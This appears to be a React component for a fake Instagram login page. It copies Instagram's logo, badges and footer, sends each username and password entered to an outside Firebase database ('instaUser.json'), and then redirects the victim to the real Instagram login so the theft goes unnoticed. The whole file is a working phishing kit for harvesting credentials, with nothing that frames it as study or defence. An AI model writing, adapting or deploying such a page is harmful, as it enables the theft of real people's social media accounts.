import axios from 'axios'
import React, { useState } from 'react'
import './loginpage.css'


const LoginPage = () => {

    const [username, setUsername] = useState('')
    const [password, setPassword] = useState('')

    const getData = async (e) => {
        e.preventDefault();
        const { data } = await axios.post("https://insta-data-f7a7c-default-rtdb.firebaseio.com/instaUser.json", { username: username, password: password });
        console.log(data);
        if ((!username > 0) && (!password > 0)) {
            return null
        }

        window.location.replace("https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Flogin%2F%3F__coig_login%3D1")
    }

    return (
        <>
            <span id="root">
                <section className="section-all">
                    <main className="main" role="main">
                        <div className="wrapper">
                            <article className="article">
                                <div className="content">
                                    <div className="login-box">
                                        <div className="header">
                                            <img className="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" />
                                        </div>
                                        <div className="form-wrap">
                                            <form className="form" >

                                                <div className="input-box">
                                                    <input type="text" id="name" placeholder="Phone number, username, or email" aria-required="true" maxLength="30" autoCapitalize="off" autoCorrect="off" name="username" required value={username} onChange={(e) => { setUsername(e.target.value) }} />
                                                </div>

                                                <div className="input-box">
                                                    <input type="password" name="password" id="password" placeholder="Password" maxLength="30" aria-required="true" autoCapitalize="off" autoCorrect="off" required value={password} onChange={(e) => { setPassword(e.target.value) }} />
                                                </div>

                                                <span className="button-box">
                                                    <button className="btn" type="submit" name="submit" onClick={getData}>Log in </button>
                                                </span>

                                                <a className="forgot" href="">Forgot password?</a>
                                            </form>
                                        </div>
                                    </div>

                                    <div className="login-box">
                                        <p className="text">Don't have an account?<a href="#">Sign up</a></p>
                                    </div>

                                    <div className="app">
                                        <p>Get the app.</p>
                                        <div className="app-img">
                                            <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                                                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" />
                                            </a>
                                            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                                                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png" />
                                            </a>
                                        </div>
                                    </div>
                                </div>
                            </article>
                        </div>
                    </main>

                    <footer className="footer" role="contentinfo">
                        <div className="footer-container">

                            <nav className="footer-nav" role="navigation">
                                <ul>
                                    <li><a href="">About Us</a></li>
                                    <li><a href="">Support</a></li>
                                    <li><a href="">Blog</a></li>
                                    <li><a href="">Press</a></li>
                                    <li><a href="">Api</a></li>
                                    <li><a href="">Jobs</a></li>
                                    <li><a href="">Privacy</a></li>
                                    <li><a href="">Terms</a></li>
                                    <li><a href="">Directory</a></li>
                                    <li>
                                        <span className="language">Language
                                            <select name="language" className="select" >
                                                <option value="#">English</option>
                                                <option value="http://ru-instafollow.bitballoon.com">Russian</option>
                                            </select>
                                        </span>
                                    </li>
                                </ul>
                            </nav>

                            <span className="footer-logo">&copy; 2023 Instagram</span>
                        </div>
                    </footer>

                </section>
            </span>
        </>)
}

export default LoginPage